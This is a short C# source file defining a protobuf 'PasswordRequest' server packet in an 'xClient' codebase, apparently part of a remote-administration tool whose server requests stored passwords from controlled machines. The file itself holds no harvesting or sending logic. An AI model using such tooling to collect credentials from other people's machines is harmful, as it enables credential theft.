using ProtoBuf;
using System;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class PasswordRequest : IPacket
    {
        public PasswordRequest()
        {
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
